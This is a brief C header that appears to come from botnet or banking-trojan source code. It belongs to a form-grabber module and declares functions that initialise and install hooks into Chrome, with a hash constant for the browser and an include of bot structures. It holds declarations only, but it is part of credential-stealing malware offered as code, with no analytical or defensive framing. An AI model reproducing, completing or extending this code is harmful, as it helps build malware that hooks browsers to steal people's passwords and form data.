#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#define HASH_CHROME 0xbb7f1e49
#include "..\common\bot_structs.h"

void initChromeHooks(HMODULE hMod);
void installChromeHooks(HMODULE hMod);
void tryInstallChromeHooks(void);

#endif